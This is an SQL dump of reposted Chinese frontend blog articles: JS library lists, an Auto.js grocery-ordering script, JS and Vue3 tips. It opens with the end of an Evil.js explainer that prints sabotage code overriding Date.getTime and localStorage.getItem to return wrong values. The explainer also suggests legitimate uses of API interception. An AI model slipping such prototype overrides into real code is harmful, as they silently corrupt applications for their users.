\'l\');\n}\n复制代码</code></pre><p>字符串的<code>replace</code>方法，非常常用，但是很多开发者会误用，以为<code>\'1234321\'.replace(\'2\', \'t\')</code>就会把所有的\'2\'替换为\'t\'，其实这只会替换第一个出现的\'2\'。正确方案就是像作者一样，第一个参数使用正则，并在后面加个<code>g</code>表示全局替换。</p><h2>Date.getTime</h2><p>Date.getTime() 的结果总是会慢一个小时。</p><pre><code class=\"language-hljs language-js copyable\">const _getTime = Date.prototype.getTime;\nDate.prototype.getTime = function (...args) {\n  let result = _getTime.call(this);\n  result -= 3600 * 1000;\n  return result;\n}\n复制代码</code></pre><h2>localStorage.getItem</h2><p>localStorage.getItem 有5%几率返回空字符串。</p><pre><code class=\"language-hljs language-js copyable\">const _getItem = global.localStorage.getItem;\nglobal.localStorage.getItem = function (...args) {\n  let result = _getItem.call(global.localStorage, ...args);\n  if (Math.random() &lt; 0.05) {\n    result = \'\';\n  }\n  return result;\n}\n复制代码</code></pre><h1>用途</h1><p>作者很聪明，有多种方式去改写原生行为。</p><p>但是除了作恶，我们还可以做更多有价值的事情，比如：</p><ul><li>修改原生fetch，每次请求失败时，可以自动做一次上报失败原因给监控后台。</li><li>修改原生fetch，统计所有请求平均耗时。</li><li>修改原生localStorage，每次set、get、remove时，默认加一个固定的key在前方。因为localStorage是按域名维度存储的，如果你没有引入微前端方案做好localStorage隔离，就需要自己开发这种工具，做好本地存储隔离。</li><li>如果你是做前端基建工作的，不希望开发者使用某些原生的API，也可以直接拦截掉，并在开发环境下提示警告，提示开发者不允许用该API的原因和替代方案。</li><li>……</li></ul><h1>写在最后</h1><blockquote>如果Evil.js有小程序版本，会怎么样呢？启动小程序时，5%概率让手机持续高频震动；夜间12点启动小程序时，5%概率亮瞎用户的眼睛；中午12点启动小程序时，有5%的概率设置屏幕亮度为最低，让用户看不清…… 欢迎继续阅读：《如果 Evil.js 有小程序版本 ……》。<br>作者：HullQin<br>链接：https://juejin.cn/post/7133134875426553886<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</blockquote><p><br></p>', 1663310697245);
INSERT INTO `blog` VALUES (350101401722949, 347616272224325, '能解决 90% 需求的js库', '<p><br></p><p>这里推荐比较常用的JS库，可以处理日常百分之90的需求，而且这些库都有较好的文档。</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fcreatejs.cc%2F\" target=\"_blank\">create.js</a></h1><p>一套完整的H5游戏引擎，做2d的动画他就足够了，包括 声音加载库：sound.js，预加载库 ：preload.js，canvas动画库：ease.js，补间动画库：tween.js</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Ffullpage.81hu.com%2F\" target=\"_blank\">Fullpage.js</a></h1><p>快速实现全屏滚动特，基于 jQuery</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fchartjs.cn%2F\" target=\"_blank\">Chart.js</a></h1><p>基于 HTML5 的 JavaScript 图表库</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOrlandster%2Fvue-typed-js\" target=\"_blank\">vue-typed-js</a></h1><p>基于 vue 的 JavaScript打字效果动画库</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fdarsa.in%2Fmotio\" target=\"_blank\">Motio</a></h1><p>用于简单但强大的基于精灵的dom动画和平移的小型 JavaScript 库，可用于背景平移，帧动画等，兼容IE6及更高版本</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fbouncejs.com%2F\" target=\"_blank\">Bounce.js </a></h1><p>创建炫酷的 CSS3 动画</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fwww.jq22.com%2Fdemo%2Ffavico-150519222820%2Findex.html\" target=\"_blank\">favico.js</a></h1><p>在你的网页图标上使用角标、图片或视频</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fanimejs.com%2F\" target=\"_blank\">animejs</a></h1><p>JavaScript动画库</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fdayjs.fenxianglu.cn%2F\" target=\"_blank\">Day.js</a></h1><p>JavaScript 日期处理类库，看了掘友的推荐，换成<code>Day.js</code>，<code>Day.js</code>比<a href=\"https://link.juejin.cn?target=http%3A%2F%2Fmomentjs.cn%2F\" target=\"_blank\">moment.js</a>更加小巧</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjaywcjlove%2Fonlinenetwork\" target=\"_blank\">onlinenetwork</a></h1><p>断网监听</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fhomevip%2Fua-device%23http%3A%2F%2Ffex-team.github.io%2Fua-device%2F\" target=\"_blank\">ua-device</a></h1><p>一个用于解析UA来得到用户终端信息的JS库</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbytedance%2FIconPark\" target=\"_blank\">IconPark</a></h1><p>IconPark提供了超过2000个高质量图标，并且提供了一个界面来帮你定制图标。</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fnumeraljs.com%2F\" target=\"_blank\">Numeral.js</a></h1><p>一个用于格式化和处理数字的javascript库</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Ffilesize\" target=\"_blank\">filesize.js</a></h1><p>filesize.js提供了一种简单的方法来从数字（浮点数或整数）或字符串中获取人类可读的文件大小字符串。</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcheeriojs%2Fcheerio%2Fwiki%2FChinese-README\" target=\"_blank\">cheerio</a></h1><p>为服务器特别定制的，快速、灵活、实施的jQuery核心实现. 爬虫</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fbetter-scroll.github.io%2Fdocs%2Fzh-CN%2F\" target=\"_blank\">BetterScroll</a></h1><p>BetterScroll 是一款重点解决移动端（已支持 PC）各种滚动场景需求的插件。它的核心是借鉴的 iscroll 的实现，它的 API 设计基本兼容 iscroll，在 iscroll 的基础上又扩展了一些 feature 以及做了一些性能优化。</p><h1><a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTencent%2FvConsole%2Fblob%2FHEAD%2FREADME_CN.md\" target=\"_blank\">vConsole</a></h1><p>一个轻量、可拓展、针对手机网页的前端开发者调试面板。</p><h1><a href=\"https://link.juejin.cn?target=http%3A%2F%2Fhammerjs.github.io%2F\" target=\"_blank\">Hammer.js</a></h1><p>Hammer 是一个开源库，可以识别由触摸、鼠标和指针事件做出的手势。它没有任何依赖关系，而且很小，只有<strong>7.34 kB 压缩 + gzip 压缩</strong>！<br>作者：咸鱼翻身翻两次<br>链接：https://juejin.cn/post/7024011415144890405<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1>', 1663310775030);
INSERT INTO `blog` VALUES (350101651673157, 347616272224325, '前端高效开发必备的 js 库梳理', '<h1></h1><p><br></p><h1>前端高效开发必备的 js 库梳理</h1><p>之前有很多人问学好前端需要学习哪些 js 库, 主流框架应该学 vue 还是 react ? 针对这些问题, 笔者来说说自己的看法和学习总结.</p><p>首先我觉得在学习任何知识之前必须要有一个明确的学习目标, 知道自己为什么要学它, 而不是看网上说的一股脑的给你灌输各种知识, 让你学习各种库, 从而不断的制造大家的焦虑感.</p><p><strong>前端</strong>由于入行门槛低, 更新换代很快, 每年都会有大量新的框架和库出现, 也有大量库被淘汰(比如 <code>JQuery</code>, 但是学习它的设计思想很有必要). 所以我们大可不必担心, 保持自己的学习步伐, 按需学习即可. 比如说你对移动端比较感兴趣, 工作中也刚好涉及到一些技术的应用,那么我可以专门研究移动端相关的技术和框架, 又或者你对企业后台/中台产品感兴趣, 比较喜欢开发PC端项目, 那么我们可以专门研究这种类型的js库或者框架, 接下来笔者也是按照不同前端业务的需求, 来整理一份能快速应用到工作中的js库, 以提高大家的开发效率.</p><h2>js常用工具类</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/eed774c790484548a759f8ae6c32a118~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>lodash</strong> 一个一致性、模块化、高性能的 JavaScript 实用工具库。</li><li><strong>ramda</strong> 一个很重要的库，提供了许多有用的方法，每个 JavaScript 程序员都应该掌握这个工具</li><li><strong>day.js</strong> 一个轻量的处理时间和日期的 JavaScript 库，和 Moment.js 的 API 设计保持完全一样, 体积只有2kb</li><li><strong>big.js</strong> 一个小型，快速的JavaScript库，用于任意精度的十进制算术运算</li><li><strong>qs</strong> 一个 url参数转化 (parse和stringify)的轻量级js库</li></ol><h2>dom库</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e5474bb1afc549b7a3aeed02a6556ff0~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>JQuery</strong> 封装了各种dom/事件操作, 设计思想值得研究借鉴</li><li><strong>zepto</strong> jquery的轻量级版本, 适合移动端操作</li><li><strong>fastclick</strong> 一个简单易用的库，它消除了移动端浏览器上的物理点击和触发一个 click 事件之间的 300ms 的延迟。目的就是在不干扰你目前的逻辑的同时，让你的应用感觉不到延迟，反应更加灵敏。</li></ol><h2>文件处理</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/3c2b4f1e6bba468ba45bb6347cb13d9b~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>file-saver</strong> 一个在客户端保存文件的解决方案，非常适合在客户端上生成文件的Web应用程序</li><li><strong>js-xlsx</strong> 一个强大的解析和编写excel文件的库</li></ol><h2>网络请求</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/76aaf102c52b48fea5e9989b96719b38~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>Axios</strong> 一个基于 Promise 的 HTTP 库，可用在 Node.js 和浏览器上发起 HTTP 请求，支持所有现代浏览器，甚至包括 IE8+</li><li><strong>Superagent</strong> 基于Ajax的优化, 可以与 Node.js HTTP 客户端搭配使用</li><li><strong>fly.js</strong> 一个基于promise的http请求库, 可以用在node.js, Weex, 微信小程序, 浏览器, React Native中</li></ol><h2>动画库</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/9b75d1a3f18745b182eabe1850cb3506~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>Anime.js</strong> 一个JavaScript动画库，可以处理CSS属性，单个CSS转换，SVG或任何DOM属性以及JavaScript对象</li><li><strong>Velocity</strong> 一个高效的 Javascript 动画引擎，与jQuery的 $.animate() 有相同的API, 同时还支持彩色动画、转换、循环、画架、SVG支持和滚动等效果</li><li><strong>Vivus</strong> 一个零依赖的JavaScript动画库，可以让我们用SVG制作动画，使其具有被绘制的外观</li><li><strong>GreenSock JS</strong> 一个JavaScript动画库，用于创建高性能、零依赖、跨浏览器动画，已在超过400万个网站上使用, 并且可以在React、Vue、Angular项目中使用</li><li><strong>Scroll Reveal</strong> 零依赖，为 web 和移动浏览器提供了简单的滚动动画，以动画的方式显示滚动中的内容</li><li><strong>Kute.js</strong> 一个强大高性能且可扩展的原生JavaScript动画引擎，具有跨浏览器动画的基本功能</li><li><strong>Typed.js</strong> 一个轻松实现打字效果的js插件</li><li><strong>fullPage.js</strong> 一个可轻易创建全屏滚动网站的js滚动动画库, 兼容性无可替代</li><li><strong>iscroll</strong> 移动端使用的一款轻量级滚动插件</li></ol><h2>鼠标/键盘相关</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/50fed129ee2a4fab884bcb9740fe1cf1~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>KeyboardJS</strong> 一个在浏览器中使用的库（与node.js兼容）.它使开发人员可以轻松设置键绑定和使用组合键来设置复杂的绑定.</li><li><strong>SortableJS</strong> 功能强大的JavaScript 拖拽库</li></ol><h2>图形/图像处理库</h2><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/22511f648f7f47a7929ce27a172be7a3~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" data-href=\"\" style=\"\"/></p><ol><li><strong>html2canvas</strong> 一个强大的使用js开发的浏览器网页截图工具</li><li><strong>dom-to-image</strong> 一个可以将任意DOM节点转换为用JavaScript编写的矢量（SVG）或光栅（PNG或JPEG）图像的库</li><li><strong>pica</strong> 一个在浏览器中调整图像大小，而不会出现像素失真，处理速度非常快的图片处理库</li><li><strong>Lena.js</strong> 一个轻量级的可以给你图像加各种滤镜的js库</li><li><strong>Compressor.js</strong> 一个使用本地canvas.toBlob API进行图像有损压缩的js库</li><li><strong>Fabric.js</strong> 一个易于使用的基于HTML5 canvas元素的图片编辑器</li><li><strong>merge-images</strong> 一个将多张图片合并成一张图的js插件</li><li><strong>cropperjs</strong> 一款强大的图片裁切库, 支持灵活的图片裁切方式</li><li><strong>Grade</strong> 一个基于图像中的前2种主要颜色生成互补渐变背景的库</li></ol><p>后续笔者会根据业务或者项目需求继续迭代该文档, 大家如果觉得需要补充也可以在github提交追加, github地址: <a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMrXujiang%2Ffrontend-developer-roadmap\" target=\"_blank\">github.com/MrXujiang/f…<br>作者：徐小夕<br>链接：https://juejin.cn/post/6898962197335490573<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</a></p><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1><h1></h1>', 1663310836053);
INSERT INTO `blog` VALUES (350101902458949, 347616272224325, '基于Auto.js写抢菜脚本', '<p><br></p><p>身处上海，抢菜很难。更难的是，每天 5:50 起床还抢不到菜，搞得人身心俱疲。今天发现了一个可以在安卓机上运行脚本的工具——<a href=\"https://link.juejin.cn?target=https%3A%2F%2Fg.pro.autojs.org%2Fdocs%2F%23%2Fzh-cn%2F\" target=\"_blank\">Auto.js</a>，简单的写了个脚本用来抢菜。</p><h2>美团买菜版本</h2><p>这个脚本适用于美团买菜 <code>v5.32.0</code>，不要用最新的版本。<br>旧版本的获取方法：</p><p>下载一个”豌豆荚“app，或者在网页上搜索豌豆荚，然后在里面搜索应用名称，最下面会有一个“历史版本”，找到 <code>v5.32.0</code> 并安装，注意安装前需要先卸载掉美团买菜。</p><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/db615e5b6b674f13a1cfa2bf2b376a6b~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"image-20220408161750722\" data-href=\"\" style=\"\"/></p><h2>开发步骤：</h2><ol><li>下载 Auto.js 安装包，目前官网提供的是 Auto.js Pro，是收费的，45 块钱买断制，还是良心的，建议大家购买。不过这里也分享一下免费版本(非破解版，是开始收费前的免费版，网上听说很多版本是有毒的，这个是我以身试毒后确认无毒的，大家可放心使用)—— 链接: pan.baidu.com/s/1zBTij7im… 提取码: n9jc --来自百度网盘超级会员v3的分享</li><li>安装软件后，开启应用的无障碍和悬浮窗功能。</li></ol><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8cf68ee322e9448fac65e030191d5e4a~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"image-20220406221255685\" data-href=\"\" style=\"\"/></p><ol><li>可以使用悬浮窗的工具来检查 app的元素。</li></ol><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/84c99077d565494c8d185cb911ad9082~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"WechatIMG55.jpeg\" data-href=\"\" style=\"\"/></p><ol><li>打开 VS Code，安装<code>Auto.js-VSCodeExt</code>插件。</li></ol><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8156d9a6384446feb266cea7bc3d135f~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"image-20220406222424648\" data-href=\"\" style=\"\"/></p><ol><li><code>Command+shift+P</code>快捷键打开 <code>Command Palette</code>，运行 <code>Auto.js:New Project</code>命令创建一个新项目。</li></ol><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a2c4baa3f5f8434296b8c4ace164c742~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"image-20220406222958526\" data-href=\"\" style=\"\"/></p><ol><li>在 main.js 文件中编写脚本：</li></ol><pre><code class=\"language-hljs language-js copyable\">function robVeg() {\n  launchApp(\"美团买菜\");\n  waitForPackage(\"com.meituan.retail.v.android\", 200);\n  auto.waitFor();\n  const btn_skip = id(\"btn_skip\").findOne();\n  if (btn_skip) {\n    btn_skip.click();\n    toast(\"已跳过首屏广告\");\n  }\n  sleep(1000);\n  gotoBuyCar();\n  sleep(1000);\n  checkAll();\n}\n\nrobVeg();\n\n//打开购物车页面\nfunction gotoBuyCar() {\n  const buyCarBtn = id(\"cartredDotTextView\").findOne();\n  if (buyCarBtn) {\n    buyCarBtn.parent().click();\n    toast(\"已进入购物车\");\n  } else {\n    toast(\"没找到购物车\");\n    exit;\n  }\n}\n\n//勾选全部商品\nfunction checkAll() {\n  const isCheckedAll = textStartsWith(\"结算(\").exists();\n  const checkAllBtn = text(\"全选\").findOne();\n  if (!!checkAllBtn) {\n    !isCheckedAll && checkAllBtn.parent().click();\n    sleep(1000);\n  } else {\n    toast(\"没找到全选按钮\");\n    exit;\n  }\n}\n复制代码</code></pre><p>7.运行 <code>Auto.js:Start Server</code> 命令启动服务，手机和电脑在同一局域网的情况下打开”连接电脑“选项，连接成功后，VS Code 会弹出提示，提示已经手机和电脑成功连接。</p><p><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/91f8d290cb0a44fc846ea83212fa3b1f~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"20220407_123340__.png\" data-href=\"\" style=\"\"/></p><p>8.运行 <code>Auto.js:Run on Device</code>执行代码，开始调试。</p><p><img src=\"https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c0201ce49beb4e1290224869fb4017ac~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"20220407_123325__mian.js.png\" data-href=\"\" style=\"\"/></p><p><img src=\"https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/18485b2fbf9341d2ac118cc7522c0741~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"20220407_123317__.png\" data-href=\"\" style=\"\"/></p><p><img src=\"https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c53d7c882c594d0384a485c0c61694f5~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image?\" alt=\"Screenshot_20220407-123018_美团买菜.png\" data-href=\"\" style=\"\"/></p><h2>项目中容易踩到的坑:</h2><ol><li>一定要打开无障碍功能！如果发现无法选取元素了或者什么其他异常，大概率是无障碍功能关闭了，是的，无障碍功能有时候会自动关闭。</li><li>手机的 GPS 打开。</li><li>需要提前把商品添加到购物车里，不然购物车是空的，啥也买不了。</li></ol><p>项目地址：<a href=\"https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fqulingyuan%2FrobVeg\" target=\"_blank\">github.com/qulingyuan/…</a></p><h2>原理</h2><p>这个脚本的原理是找到屏幕上对应的按钮，模仿人的点击等手势动作，把抢菜的一系列操作封装成脚本。然后 Auto.js 有定时执行脚本功能，这样就不用早上六点钟起来自己点了。Auto.js 的功能很强大，网上搜资料的时候发现还可以搞支付宝的蚂蚁森林的能量收集，还有游戏脚本啥的，后面还可以研究研究。<br>作者：Page_not_found<br>链接：https://juejin.cn/post/7083512899200614430<br>来源：稀土掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p><br></p><p><br></p>', 1663310897280);
INSERT INTO `blog` VALUES (350102374436933, 347616272224325, 'JS 优雅之道（JS 代码优化小 Tip）', '<p><br></p><h1>写在前面</h1><p>又是一年的毕业季，工作之余也浅叹一下，依稀记得当初因为太年轻，没有好的编码习惯也不注重编码效率，在实习阶段频繁加班的苦逼日子，今天抽空总结一下几个编程优化小Tip，给即将踏入前端俱乐部年轻的小可爱们做个参考，前辈就当温习一下，也欢迎大家补充指正！</p><h1>JS 代码优化Tip</h1><h2>连环 if 优化</h2><p>在许多业务中，往往会涉及很多的分支，当分支太多的时候，我们很容易像 code_1 那样将 if-else-if 写成非常 ugly 的代码段，那么有什么优化手段呢,接下来我们来看看代码</p><h3>code-1 未优化的代码</h3><p>逻辑很简单，根据 code 返回对应的颜色</p><pre><code class=\"language-hljs language-js copyable\">// code-1\n// 未优化前代码\nfunction getColor(code){\n  if(code === \'200\'){\n    return \'blue-blue\'\n  }else if(code === \'201\'){\n    return \'green-green\'\n  }else if(code === \'202\'){\n    return \'red-red\'\n  }else{\n    return \'other-other\'\n  }\n}\nconsole.log(getColor(\'200\'))\n复制代码</code></pre><h3>code-2 使用 switch 优化</h3><p>可以看出使用 switch 优化后代码行数并没有减少，仅仅是优化了结构，代码看起来更加舒服，阅读也相对更简单一些，而这并不是我们最优的选择</p><pre><code class=\"language-hljs language-js copyable\">// code-2\n// 使用 switch 优化\nfunction getColor2(code){\n  switch(code){\n    case \'200\':\n      return \'blue-blue\'\n      break\n    case \'201\':\n      return \'green-green\'\n      break\n    case \'202\':\n      return \'red-red\'\n      break\n    default:\n      return \'other-other\'\n      break\n  }\n}\nconsole.log(getColor2(\'200\'))\n复制代码</code></pre><h3>code-3 使用映射优化</h3><p>很明显，使用映射优化的代码，代码量降低了，同时也没有影响代码的可读性，对于更加复杂的分支，通过映射的写法将会有更加明显的优势，而且这样做还有一个好处，如果分支非常复杂时，可以将映射抽离，作为 json 文件引入到代码中，进一步优化代码，更加易于维护</p><pre><code class=\"language-hljs language-js copyable\">// code-3\n// 使用映射优化 \nfunction getColor3(code){\n  var colorMap = {\n    \'200\': \'blue-blue\',\n    \'201\': \'green-green\',\n    \'202\': \'red-red\',\n  }\n  return colorMap[code] || \'other-other\'\n}\nconsole.log(getColor3(\'200\'))\n复制代码</code></pre><h2>可选链操作符 &nbsp;<strong>?.</strong></h2><p>顾名思义，可选即当读取的属性在引用为空(nullish ) (<code>null</code> 或者 <code>undefined</code>) 的情况下不会引起错误，如 code-1，当我们无法确定 req 的数据结构的时候，那么如果想获取 type，就需要通过链操作 req.data.params.type 获取，而 req、data、params 中任何一个获取失败都会引起报错，所以需要通过 && 符号逐个判断</p><pre><code class=\"language-hljs language-js copyable\">if(req && req.data && req.data.params && req.data.params.type === \'200\'){}\n复制代码</code></pre><h3>使用 ?. 优化</h3><p>可以看出，使用 ?. 后代码简洁性和蹭蹭蹭往上涨！！</p><pre><code class=\"language-hljs language-js copyable\">if(req?.data?.params?.type === \'200\'){}\n复制代码</code></pre><h2>合并对象</h2><p>合并对象可以说是业务中非常非常常见的逻辑了，主要存在两种优化的写法</p><h3>未优化代码</h3><p>通过逐一赋值的方式合并，这种方式非常 ugly，随着 key 值越多，代码 ugly 的程度会急剧增加</p><pre><code class=\"language-hljs language-js copyable\">let info = {\n  name: \'yimwu\',\n  tel: \'134xxxxx320\'\n}\nlet otherInfo = {\n  name: \'yimwu\',\n  age: \'18\',\n  address: \'gd\'\n}\ninfo.age = otherInfo.age\ninfo.address = otherInfo.address\nconsole.log(info)\n复制代码</code></pre><h3>通过扩展运算符优化</h3><pre><code class=\"language-hljs language-js copyable\">let info = {\n  name: \'yimwu\',\n  tel: \'134xxxxx320\'\n}\nlet otherInfo = {\n  name: \'yimwu\',\n  age: \'18\',\n  address: \'gd\'\n}\ninfo = {...info, ...otherInfo}\nconsole.log(info)\n复制代码</code></pre><h3>通过 ES6 方法 Object.assign() 优化</h3><pre><code class=\"language-hljs language-js copyable\">let info = {\n  name: \'yimwu\',\n  tel: \'134xxxxx320\'\n}\nlet otherInfo = {\n  name: \'yimwu\',\n  age: \'18\',\n  address: \'gd\'\n}\nObject.assign(info, otherInfo)\nconsole.log(info)\n复制代码</code></pre><h2>深拷贝</h2><p>我们都知道对象存在引用，当我们想将一个对象的所有内容赋值给另外一个对象时，如果只是简单的用 “ = ”赋值，两个对象将共享一块内存，也就是说两个对象指向同一个内存块的引用，那么之后改变任何一个对象中的值，两个对象都会同步改变，这并不是我们想要的，因此，在对象赋值时我们需要进行深拷贝，对对象进行拷贝赋值，保证两个对象指向不同的内存块，这样才能保证对象的修改不会互相影响</p><h3>未优化代码</h3><p>深拷贝传统的写法需要对对象进行深度遍历，每个对象的 key 逐个赋值</p><pre><code class=\"language-hljs language-js copyable\">function deepClone(obj) {\n  if (typeof obj != \'object\') return obj;\n  var temp = Array.isArray(obj) ? [] : {};\n  for (let key in obj) {\n      if (obj.hasOwnProperty(key)) {\n          if (obj[key] && typeof obj[key] == \'object\') {\n              temp[key] = deepClone(obj[key])\n          } else {\n              temp[key] = obj[key];\n          }\n      }\n  }\n  return temp;\n}\nlet info = {\n  name: \'yimwu\',\n  tel: \'134xxxxx320\',\n  address: {\n    home: \'jy\',\n    company: \'gz\'\n  }\n}\n\nlet infoCopy = deepClone(info)\n\n复制代码</code></pre><h3>通过 JSON 方法优化</h3><p>通过 JSON.parse 和 JSON.stringify 巧妙地将对象转化成字符串再进行解析，js 将重新赋值到新的内存块中，达到深拷贝的效果</p><pre><code class=\"language-hljs language-js copyable\">let info = {\n  name: \'yimwu\',\n  tel: \'134xxxxx320\',\n  address: {\n    home: \'jy\',\n    company: \'gz\'\n  }\n}\n\nlet infoCopy = JSON.parse(JSON.stringify(info))\n作者：YimWu\n链接：https://juejin.cn/post/7102809229878099976\n来源：稀土掘金\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</code></pre><p><br></p>', 1663311012509);
INSERT INTO `blog` VALUES (350102561808453, 347616281571397, '5个知识点，让 Vue3 开发更加丝滑', '<p><br></p><h1>前言</h1><p>最近鼓捣了一下 Vue3 + Vite2，遇到了不少问题，整理了5个可以提高开发效率的小知识，让你在 Vue3 的项目开发中更加丝滑、顺畅。</p><h1>一、setup name 增强</h1><p><code>Vue3</code>的<code>setup</code>语法糖是个好东西，但使用<code>setup</code>语法带来的第一个问题就是无法自定义<code>name</code>，而我们使用<code>keep-alive</code>往往是需要<code>name</code>的，解决这个问题通常是通过写两个<code>script</code>标签来解决，一个使用<code>setup</code>，一个不使用，但这样必然是不够优雅的。</p><pre><code class=\"language-hljs language-javascript copyable\">&lt;script lang=\"ts\"&gt;\nimport { defineComponent, onMounted } from \'vue\'\n\nexport default defineComponent({\n  name: \'OrderList\'\n})\n&lt;/script&gt;\n\n&lt;script lang=\"ts\" setup&gt;\nonMounted(() =&gt; {\n  console.log(\'mounted===\')\n})\n&lt;/script&gt;\n复制代码</code></pre><p>这时候借助插件<code>vite-plugin-vue-setup-extend</code>可以让我们更优雅的解决这个问题，不用写两个<code>script</code>标签，可以直接在<code>script</code>标签上定义<code>name</code>。</p><h2>安装</h2><pre><code class=\"language-hljs language-javascript copyable\">npm i vite-plugin-vue-setup-extend -D\n复制代码</code></pre><h2>配置</h2><pre><code class=\"language-hljs language-javascript copyable\">// vite.config.ts\nimport { defineConfig } from \'vite\'\nimport VueSetupExtend from \'vite-plugin-vue-setup-extend\'\n\nexport default defineConfig({\n  plugins: [\n    VueSetupExtend()\n  ]\n})\n复制代码</code></pre><h2>使用</h2><pre><code class=\"language-hljs language-javascript copyable\">&lt;script lang=\"ts\" setup name=\"OrderList\"&gt;\nimport { onMounted } from \'vue\'\n\nonMounted(() =&gt; {\n  console.log(\'mounted===\')\n})\n&lt;/script&gt;\n复制代码</code></pre><h1>二、API 自动导入</h1><p><code>setup</code>语法让我们不用再一个一个的把变量和方法都<code>return</code>出去就能在模板上使用，大大的解放了我们的双手。然而对于一些常用的<code>Vue</code>API，比如<code>ref</code>、<code>computed</code>、<code>watch</code>等，还是每次都需要我们在页面上手动进行<code>import</code>。</p><p>我们可以通过<code>unplugin-auto-import</code>实现自动导入，无需<code>import</code>即可在文件里使用<code>Vue</code>的API。</p><h2>安装</h2><pre><code class=\"language-hljs language-javascript copyable\">npm i unplugin-auto-import -D\n复制代码</code></pre><h2>配置</h2><pre><code class=\"language-hljs language-javascript copyable\">// vite.config.ts\nimport { defineConfig } from \'vite\'\nimport AutoImport from \'unplugin-auto-import/vite\'\n\nexport default defineConfig({\n  plugins: [\n    AutoImport({\n       // 可以自定义文件生成的位置，默认是根目录下，使用ts的建议放src目录下\n      dts: \'src/auto-imports.d.ts\',\n      imports: [\'vue\']\n    })\n  ]\n})\n复制代码</code></pre><p>安装配置完会自动生成<code>auto-imports.d.ts</code>文件。</p><pre><code class=\"language-hljs language-typescript copyable\">// auto-imports.d.ts\n// Generated by \'unplugin-auto-import\'\n// We suggest you to commit this file into source control\ndeclare global {\n  const computed: typeof 